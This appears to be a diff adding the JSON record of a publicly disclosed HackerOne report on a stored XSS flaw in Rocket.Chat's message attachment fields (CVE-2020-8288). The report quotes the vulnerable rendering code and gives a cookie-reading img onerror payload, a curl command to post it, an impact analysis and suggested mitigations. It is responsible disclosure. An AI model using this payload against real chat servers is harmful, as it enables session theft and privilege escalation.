@@ -1,0 +1,133 @@
+{
+  "id": 899954,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTk5NTQ=",
+  "url": "https://hackerone.com/reports/899954",
+  "title": "XSS in message attachment fileds.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-16T21:19:49.402Z",
+  "submitted_at": "2020-06-16T21:19:49.402Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fabianfreyer",
+    "url": "/fabianfreyer",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8288"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-01-17T18:37:40.648Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-12-18T18:37:40.122Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\n\n**Summary:** There is a Cross-Site Scripting vulnerability in the message attachment fields.\n\n**Description:**\n\nIf no custom renderer is set, the `specializedRendering` function will render any HTML provided in the `value` field of the attachment:\n\n```js\n\tspecializedRendering({ hash: { field, message } }) {\n\t\tlet html = '';\n\t\tif (field.type && renderers[field.type]) {\n\t\t\thtml = Blaze.toHTMLWithData(Template[renderers[field.type]], { field, message });\n\t\t} else {\n\t\t\t// consider the value already formatted as html\n\t\t\thtml = field.value;\n\t\t}\n\t\treturn `<div class=\"${ field.type }\">${ html }</div>`;\n\t},\n```\n\n## Releases Affected:\n\n  * Rocket.Chat up to 3.3.3\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n1. Get an Personal Access Token.\n2. Create a channel \"#cookies\"\n3. Invite administrators into \"#cookies\", e.g. by promising them yummy cookies.\n4. Put the following payload in a file, calling it `cookiesplz.json`:\n\n    ```\n    {\n        \"channel\": \"#cookies\",\n        \"text\": \"Hi, I'd like a cookie please\",\n        \"attachments\": [\n            {\n                \"text\": \"ohai\",\n                \"fields\": [\n                    {\n                        \"type\": \"hello from project pwner\",\n                        \"title\": \"pwn\",\n                        \"value\": \"test<img src=x onerror='alert(document.cookie);'/>\",\n                        \"short\": false\n                    }\n                ]\n            }\n        ]\n    }\n   ```\n\n5. Run the following curl request: `curl -H \"X-Auth-Token: <Token>\" -H \"X-User-Id: <user Id>\" -H \"Content-type:application/json\" https://<server>/api/v1/chat.postMessage -d @cookiesplz.json`\n\n## Supporting Material/References:\n\n  * https://docs.rocket.chat/api/rest-api/methods/chat/postmessage#attachment-field-objects\n\n## Suggested mitigation\n\n  * Don't render verbatim HTML from user input.\n  * Mitigate XSS using CSP headers.\n\n## Impact\n\nUsing this vulnerability, an attacker can steal cookies of other users, including administrators to elevate their privileges. They can leak a user’s messages, critically impacting confidentiality. An attack payload may also Exit or delete messages, potentially removing traces of exploits and critically impacting integrity and availability. Finally, by escalating privileges, an attacker can restart the server and edit important settings, impacting availability. By using XSS execution, an attacker may send the payload to other users, i.e. this vulnerability is \"wormable\" on the same server.\n\nIn the electron client, this XSS can be used to get remote code execution.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-01-17T18:37:40.180Z",
+  "allow_singular_disclosure_after": -167431098.30552858,
+  "singular_disclosure_allowed": true,
+  "vote_count": 16,
+  "voters": [
+    "rook1337",
+    "ali",
+    "tess",
+    "h4x0r_dz",
+    "mrsinister15",
+    "0x0days",
+    "kali_linux_1337_pixel_gamer_yt",
+    "thelilnix",
+    "sir-poppin",
+    "azeifoldanova",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
